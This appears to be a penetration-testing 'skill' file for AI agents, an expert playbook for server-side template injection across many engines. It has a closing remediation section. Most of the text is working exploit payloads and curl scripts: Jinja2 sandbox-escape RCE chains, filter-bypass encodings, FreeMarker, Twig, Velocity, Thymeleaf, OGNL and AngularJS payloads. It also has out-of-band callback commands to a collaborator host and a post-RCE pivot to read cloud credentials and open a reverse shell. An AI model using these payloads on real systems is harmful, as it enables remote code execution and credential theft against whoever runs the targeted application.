---
name: ssti-server-side-template-injection
description: >-
  SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content.
---

# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Before using full engine-specific exploitation, you can first load:

- First use the polyglot probe sequence at the top of this file for low-noise fingerprinting
- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) — different attack surface from template engines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Maccms 8.x PHP template `eval` — `{if-A:phpinfo()}{endif-A}` in `vod-search`, base64 bypass for webshell write
- Jira CVE-2019-11581 — "Contact Administrators" form → Velocity template injection → command output in admin email
- Spring Cloud Gateway SpEL (CVE-2022-22947) — actuator route injection with `StreamUtils.copyToByteArray` for output capture
- Struts2 OGNL S2-045 (CVE-2017-5638) — Content-Type header OGNL injection with `_memberAccess` / `OgnlUtil` blacklist clear
- Confluence OGNL CVE-2021-26084 — `createpage-entervariables.action` with `\u0027` unicode bypass
- SSTI vs EL injection disambiguation guide
- Additional template engines: ASP.NET Razor, Elixir EEx, PHP Smarty/Latte/Blade, JS Pug/Handlebars/Nunjucks/EJS/Lodash + universal detection + blind SSTI + Flask PIN calculation

**SCENARIOS.md reference (§7–§11):** For expanded payloads and engine-specific notes on Razor, EEx/LEEx/HEEx, PHP stacks, JavaScript template engines, the universal polyglot probe, mathematical fingerprinting, blind SSTI (boolean / time / OOB), and Flask debug PIN prerequisites, see [SCENARIOS.md](./SCENARIOS.md). This skill keeps a short checklist in §13–§15.

### Engine Payloads Reference

For extended engine-specific fingerprinting, payload matrices (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Slim, Handlebars, Thymeleaf, Smarty, ERB, Jade/Pug), and blind SSTI detection techniques (timing-based, DNS-based), see [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md).

### Universal detection & blind SSTI (pointer)

Use the polyglot payload and math probes in §1 and §13 first; when you need fuller blind-test patterns and per-engine examples (including non-Python stacks), follow [SCENARIOS.md](./SCENARIOS.md) §11 and cross-check §14 here for technique names (boolean, time, OOB, error-based).

---

## 1. DETECTION — POLYGLOT PROBE SEQUENCE

First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:

```
{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
```

**Jinja2 vs Twig disambiguation**:
```
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric)
```

**Safe detection probe** (no math, just boolean):
```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony, Laravel |
| Smarty | PHP | Various |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various Java |
| Pebble | Java | Various Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

Identifying language from errors → then narrow to template engine.

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

### Chain 1: `os` module via `__globals__`
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Chain 2: MRO subclass traversal (sandbox escape)
```python
# List all subclasses:
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually around 258-270, varies by Python version):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
```

### Chain 3: `request` object globals (works when `config` blocked)
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
(Uses hex encoding to avoid `_` filtering)

### Chain 4: `lipsum` function globals (Flask built-in)
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

### Chain 5: `cycler` object
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Finding correct subprocess index dynamically:
```jinja2
# In injection:
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{loop.index}}
  {% endif %}
{% endfor %}
```

---

## 4. JINJA2 SANDBOX BYPASS TECHNIQUES

### When `_` (underscore) is blocked:
```python
# Use attr filter with hex encoding:
''|attr('\x5f\x5fclass\x5f\x5f')

# Use getattr via request object:
request|attr('args')|attr('__class__')
```

### When `.` (dot) is blocked:
```python
# Use [] subscript notation:
''['__class__']
config['SECRET_KEY']
```

### When keywords (class, mro) are blocked:
Use hex/unicode in `attr()`:
```jinja2
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
```

### When output encoding strips HTML entities:
Use `|safe` filter to prevent auto-escaping.

---

## 5. FREEMARKER (JAVA) — RCE

### Execute Command via freemarker.template.utility.Execute
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### Alternative via ObjectConstructor:
```freemarker  
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

---

## 6. TWIG (PHP) — RCE

```php
// Twig 1.x (before sandbox):
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x using built-ins:
{{['id']|map('system')|join}}

// via filter map:
{{app.request.server.all|join(',')}}
```

---

## 7. VELOCITY (JAVA) — RCE

```velocity
#set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
#set($run=$str.exec("id"))
#set($out=$run.inputStream)
```

Or more directly:
```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (RUBY RAILS) — RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

## 9. THYMELEAF (JAVA SPRING) — RCE

Thymeleaf with Spring EL (SpEL):
```java
// In th:text or th:fragment context:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

// Fragment expression context:
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. CLIENT-SIDE TEMPLATE INJECTION (AngularJS)

When AngularJS is used client-side and user data flows into template expressions:

```javascript
// AngularJS 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Detection**: send `{{1+1}}` — if page shows `2`, AngularJS evaluates expressions in the DOM.

---

## 11. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → config.__globals__['os'].popen() 
│           OR subclass traversal for Popen
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── Angular CSTI → constructor.constructor('payload')()
```

**Post-RCE pivot**:
1. Read `/proc/self/environ` — env vars with credentials
2. Read application config files — DB passwords, API keys
3. `cat ~/.aws/credentials` — cloud credentials
4. Reverse shell for persistence

---

## 12. COMMON INJECTION ENTRY POINTS

Where user data enters templates:
- URL path: `https://site.com/home?name={{7*7}}`
- Query parameters: `?message=Hello`
- HTML forms: profile name, bio, content fields
- Error pages: `404 Not Found: /PAYLOAD`
- Email templates: name in password reset emails
- Inline template rendering: `render_template_string(user_input)`

**Most dangerous**: `render_template_string()` in Flask — entire user input used as template.

---

## 13. UNIVERSAL DETECTION PAYLOADS

**Polyglot probe** that triggers errors or evaluation in many engines:

```
${{<%[%'"}}%\.
```

**Mathematical probes** for blind/error confirmation:

```
{{7*7}}          → 49 (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}           → 49 (FreeMarker, Velocity, EL, Thymeleaf)
<%= 7*7 %>       → 49 (ERB, EJS, EEx)
#{7*7}           → 49 (Pug, Ruby interpolation)
@(7*7)           → 49 (Razor)
{7*7}            → 49 (Smarty)
```

**Error-based engine fingerprint** (parser/stack traces often name the engine):

```
(1/0).zxy.zxy
```

---

## 14. BLIND SSTI TECHNIQUES

- **Boolean-based**: Compare `(3*4/2)` vs `3*)2(/4` — if the first resolves and the second errors, evaluation is likely
- **Time-based**: `{{sleep(5)}}` or the engine-specific equivalent for delay
- **OOB**: DNS/HTTP callback via template expressions when direct output is not visible
- **Error-based**: Force different error messages based on true/false conditions

---

## 15. FLASK PIN CALCULATION

When Flask **debug mode** (Werkzeug debugger) is exposed but **PIN-protected**, the PIN is derived from host-specific values. Typical inputs for public PIN calculation scripts:

1. **`username`** — from `/etc/passwd` (the user running the Flask process)
2. **Module name** — often `flask.app` or `Flask`
3. **Application path** — `app.py` or the real main filename
4. **MAC address** — e.g. `/sys/class/net/eth0/address`, converted to decimal as Werkzeug expects
5. **Machine ID** — `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with the first line of `/proc/self/cgroup` per Werkzeug’s algorithm
6. **Compute PIN** — use established open-source PIN calculators that implement the same algorithm from these values

> Use only on systems you are authorized to test; obtaining these values implies prior access or an additional info-disclosure vector.

---

## 16. EXECUTION PRIMITIVES

SSTI is proven by **arithmetic that the server evaluated**, then by a command whose output came back.
Each block moves one step further along that path.

### 16.1 The arithmetic probe, engine-agnostic

```bash
# ${7*7} is the universal first probe; a 49 in the response means evaluation, not reflection
for P in '${7*7}' '{{7*7}}' '#{7*7}' '@(7*7)' '%{7*7}' '{{7*"7"}}' '${7*"7"}' '*{7*7}'; do
  R=$(curl -sS --get --data-urlencode "name=$P" "https://target.tld/greet" -o /tmp/s -w '%{http_code}')
  printf '%-14s %s  reflect=%s eval49=%s eval77=%s\n' "$P" "$R" \
    "$(grep -c '7\*7' /tmp/s)" "$(grep -c '\b49\b' /tmp/s)" "$(grep -c '\b77\b' /tmp/s)"
done
```

Three outcomes matter: the payload **reflected verbatim** (no evaluation), `49` (**numeric
evaluation** - the finding), or `77` (**string concatenation** - evaluation of a different kind, which
also proves it). Record which one you got for each syntax.

### 16.2 Differentiate the engine with a fingerprint matrix

```bash
for P in \
  '{{7*7}}' '{{7*"7"}}' '{{7*7}}${7*7}' \
  '${7*7}{{7*7}}<%= 7*7 %>' \
  "{{''.__class__}}" '{{self}}' '{{_self}}' '${T(java.lang.Runtime)}' \
  '#{7*7}' '[[${7*7}]]' '~{7*7}' ; do
  R=$(curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" -o /tmp/f; grep -oE '49|77|error|exception|<class|Runtime' /tmp/f | sort -u | tr '\n' ' ')
  printf '%-40s -> %s\n' "$P" "$R"
done
```

`{{7*"7"}}` yielding `7777777` is Jinja2/Twig-family; `{{7*7}}${7*7}` yielding `4949` is Twig;
`${T(java.lang.Runtime)}` is SpEL; `[[${7*7}]]` and `~{7*7}` are Thymeleaf. **The fingerprint decides
which RCE chain applies** - do not skip it and guess.

### 16.3 Prove the evaluation is server-side, not client-side

```bash
# send the payload with curl (no browser, no JS) and check for the evaluated value
curl -sS --get --data-urlencode "name={{7*7}}" "https://target.tld/greet" | grep -oE '\b49\b' | head -3
# and confirm the raw payload is NOT in the source (the client-side case would show it)
curl -sS --get --data-urlencode "name={{7*7}}" "https://target.tld/greet" | grep -c '7\*7'
```

A value that only appears when a browser runs the page is client-side template injection (Angular),
which is a different finding with a different deliverable. **curl is the discriminator.**

### 16.4 Jinja2 information disclosure, then a file read

```bash
# the standard disclosure chain, one step at a time
for P in \
  "{{config}}" \
  "{{config.items()}}" \
  "{{''.__class__.__mro__}}" \
  "{{request.application.__globals__.__builtins__}}" \
  "{{cycler.__init__.__globals__.os.popen('id').read()}}" ; do
  echo "=== $P"
  curl -sS --get --data-urlencode "name=$P" "https://target.tld/greet" | head -c 300; echo
done
# and a file read
curl -sS --get --data-urlencode "name={{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}" \
  "https://target.tld/greet" | head -c 300
```

The **`id` output is the proof**. `{{config}}` leaking `SECRET_KEY` is a strong secondary finding, and
with the secret you can forge session cookies - but only if you demonstrate the forged cookie being
accepted.

### 16.5 Sandboxed Jinja2 escape

```bash
# when the engine is sandboxed, the classic chain is blocked; these are the known escape families
for P in \
  "{{''.__class__.__mro__[1].__subclasses__()}}" \
  "{{lipsum.__globals__['os'].popen('id').read()}}" \
  "{{joiner.__init__.__globals__.os.popen('id').read()}}" \
  "{{namespace.__init__.__globals__.os.popen('id').read()}}" \
  "{{(lambda:0).__globals__['__builtins__']['__import__']('os').popen('id').read()}}" \
  "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('__getitem__')('os')}}" ; do
  echo "=== $P"
  curl -sS --get --data-urlencode "name=$P" "https://target.tld/greet" | head -c 200; echo
done
```

`lipsum`, `cycler`, `joiner`, and `namespace` are helper objects whose `__globals__` still holds the
real `os` module in most deployments. **One working chain is enough** - stop at the first `uid=`.

### 16.6 Java engines: SpEL, OGNL, FreeMarker, Thymeleaf

```bash
# SpEL - the three common variants
for P in \
  '${T(java.lang.Runtime).getRuntime().exec("id")}' \
  '*{T(java.lang.Runtime).getRuntime().exec("id")}' \
  '${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream(),T(java.nio.charset.Charset).forName("UTF-8"))}' ; do
  echo "=== SpEL $P"
  curl -sS --get --data-urlencode "q=$P" "https://target.tld/search" | head -c 200; echo
done
# OGNL (Struts) - command output via a return value, not blind
echo '=== OGNL'
curl -sS --get --data-urlencode "q=%25%7B%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22)%7D" "https://target.tld/" | head -c 200
# FreeMarker / Thymeleaf pre-3.0
echo '=== FreeMarker'
curl -sS --get --data-urlencode 'q=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' "https://target.tld/" | head -c 200
echo '=== Thymeleaf'
curl -sS --get --data-urlencode 'q=__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x' "https://target.tld/" | head -c 200
```

**`exec` returns a `Process` without returning output** in several of these; the printable variant
wraps it in a stream reader. If you see `Process[pid=...]` rather than `uid=`, the command **did run** -
that is still proof, and the output can be retrieved with the reader variant.

### 16.7 Blind SSTI over time

```bash
# no output comes back: measure the difference instead
B=$(curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "name=x" "https://target.tld/greet")
for P in "{{7*7}}" "{{range(1000000)|list|length}}" "{{'a'.zfill(100000000)}}" \
         "{% for i in range(5000000) %}{% endfor %}"; do
  T=$(curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "name=$P" "https://target.tld/greet")
  echo "$P -> ${T}s (baseline ${B}s)"
done
```

A payload that adds seconds over the baseline proves evaluation in a blind context. Use a loop bound
you can afford - **never an unbounded loop**, which is a denial of service on a live system.

### 16.8 Out-of-band and file-based confirmation

```bash
# DNS/HTTP callback from inside the template engine
curl -sS --get --data-urlencode "name={{cycler.__init__.__globals__.os.popen('curl http://COLLAB/ssti').read()}}" \
  "https://target.tld/greet" -o /dev/null
sleep 5; grep -c 'ssti' /path/to/collab.log
# when curl is absent, DNS through a resolver that is definitely reachable
curl -sS --get --data-urlencode "name={{cycler.__init__.__globals__.os.popen('nslookup ssti.COLLAB').read()}}" \
  "https://target.tld/greet" -o /dev/null
```

A callback works where output is suppressed, and it is the strongest blind-context proof. If the
engine has no `os` access, use the template's own network features (Twig's `http` extension, FreeMarker
with an HTTP client bean) - the principle is the same: **make the server reach you**.

### 16.9 Client-side template injection confirmation

```bash
# AngularJS: the payload must be evaluated BY THE BROWSER, so drive a real one
cat > /tmp/csti.html <<'HTML'
<!doctype html><html ng-app><body>
<div id=box>{{constructor.constructor('alert(1)')()}}</div>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
</body></html>
HTML
echo "open /tmp/csti.html - if an alert fires, the client-side engine evaluates user input"
```

A reflected `{{7*7}}` that renders as `49` **only in a browser** is CSTI: report the sink, the version
of Angular/Vue, and the fact that the server-side render is inert. It is an XSS-class finding, not an
RCE one.

---

## 17. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the server **evaluate** the expression (`49`), rather than reflect `7*7`? | reflection is not injection |
| 2 | Did you get **command output** (`uid=`) or a `Process[...]` object? | code execution, the highest-confidence proof |
| 3 | Which **engine and version** does the fingerprint match? | determines the applicable chain and the fix |
| 4 | Is the input **attacker-supplied and rendered by the template**, not merely echoed? | otherwise it is reflection in a template's output |
| 5 | For blind contexts, is there a **timing or OOB difference** over a measured baseline? | the only available proof when output is suppressed |
| 6 | Is the evaluation **server-side** (proved with curl), not a client-side engine? | CSTI is a different finding with a different impact |
| 7 | Did you use a **read-only command** (`id`, `hostname`) rather than anything state-changing? | scope discipline |

**`uid=` is the bar.** A `49` proves evaluation and justifies reporting SSTI; only command output
justifies an RCE claim. If you have `49` and no output, say SSTI with the engine named.

---

## 18. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **injection point** - the parameter, header, or body field, and the endpoint | the reproduction |
| The **exact payload** that evaluated, with the response showing `49` or the command output | a fingerprint matrix without a working payload is a survey |
| The **engine and version**, with the evidence that identified it | every chain and every fix is engine-specific |
| The **proved capability level** - evaluation, file read, or command execution - stated separately | an RCE claim needs command output |
| For blind: the **timing baseline and the delta**, or the **OOB callback** with its timestamp | output-free contexts need a measured oracle |
| The **server-side proof** (curl, no browser) | distinguishes SSTI from CSTI |
| For a `SECRET_KEY` disclosure: the **forged artefact and its acceptance** | a leaked key alone is unproven impact |
| **Negative control** - the same parameter with a non-template string does not evaluate | rules out a page that always contains a number |
| Confirmation the commands were **read-only** and no files were modified | scope discipline |
| The **template files** the input reaches, where you have source access | the fix location |

Report the **evaluated expression and the reached capability**: "the `name` parameter on `/greet` is
passed to `render_template_string`; `${7*7}` and `{{7*7}}` both return `49` where a plain string is
returned verbatim, and `{{cycler.__init__.__globals__.os.popen('id').read()}}` returned
`uid=33(www-data) gid=33(www-data)`; the response headers and the `SECRET_KEY`-bearing
`{{config}}` output identify Flask with Jinja2 3.1.2, unsandboxed", never "the application is
vulnerable to SSTI".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The payload appears verbatim in the response | reflection, not evaluation |
| `49` appears somewhere on a page that always contains numbers | no causal link; use a random operand |
| The evaluation happens only in a browser | client-side template injection - a different finding |
| A static page containing template syntax in documentation | not rendered |
| `${7*7}` reflected but `{{7*7}}` evaluates | report only the syntax that works |
| A `500` from a malformed payload | an error is not evaluation |
| A timing difference from a slow template rather than your payload | measure a baseline |
| A leaked `SECRET_KEY` you never used to forge anything | a disclosure, not session forgery |
| Command execution claimed from `Process[pid=...]` with no reader | the command ran; state it precisely |
| A sandbox escape payload that returned an error | the sandbox held |
| An injection you can only reach by editing the request in a proxy with no delivery path | not reachable |
| A template you wrote yourself to demonstrate a chain | tests your code |

**Fingerprint, then prove one capability.** A matrix of probes with no working payload is a survey,
not a finding.

---

## 19. REMEDIATION REFERENCE

1. **Never build templates from user input, and never call `render_template_string` on a variable** - the fix is architectural: templates are developer artefacts, and user data is only ever a value passed into a template.
2. **Pass user input as data in a context, not as template source** - `render_template("greet.html", name=user_input)` renders the value inert; the same string concatenated into template source is the vulnerability.
3. **Use the engine's sandbox, and keep it updated** - Jinja2's `SandboxedEnvironment` and equivalents raise the bar, but they are not a substitute for the architectural fix and have escaped repeatedly.
4. **Avoid `eval`-like features entirely** - SpEL, OGNL, and JEXL should never evaluate user-controllable expressions; if a feature needs expression input, use a constrained, allowlisted parser rather than the general-purpose language.
5. **Remove dangerous methods from the JAVA EL / SpEL / OGNL context** - do not expose `Runtime`, `ProcessBuilder`, `Class.forName`, or reflection helpers in the evaluation context, and restrict `T()` type references.
6. **Set a strict template auto-escaping policy and keep it on by default** - autoescaping does not prevent SSTI, but disabling it turns every value into a second injection class.
7. **Grant the application's user account nothing it does not need** - an RCE in a process running as an unprivileged account with no filesystem write is materially less severe; least privilege is the containment control.
8. **Keep `SECRET_KEY` and similar secrets out of any context a template can read** - a template with access to the session key means evaluation escalates to forged sessions immediately.
9. **Do not return raw engine errors to users** - engine stack traces name the engine, the version, and the template file, which is the fingerprint an attacker would otherwise have to derive.
10. **Add a template-content inventory and review emails, exports, CMS fields, and report builders** - these are the entry points where user input reaches a renderer, and they are the ones most often missed.
11. **Test with a payload in every user-controllable field in CI** - assert that `{{7*7}}`, `${7*7}`, and `<%= 7*7 %>` never evaluate; a single automated test detects this entire class.

---

## 20. RELATED SIBLINGS - LOAD TOGETHER

- [expression-language-injection](../expression-language-injection/SKILL.md) - the Java-side evaluation class this overlaps with
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the sink an SSTI chain reaches
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the file read the disclosure chain performs
- [xss-exploitation-chains](../xss-exploitation-chains/SKILL.md) - the client-side template variant
- [api-auth-and-jwt-abuse](../api-auth-and-jwt-abuse/SKILL.md) - what a leaked `SECRET_KEY` enables
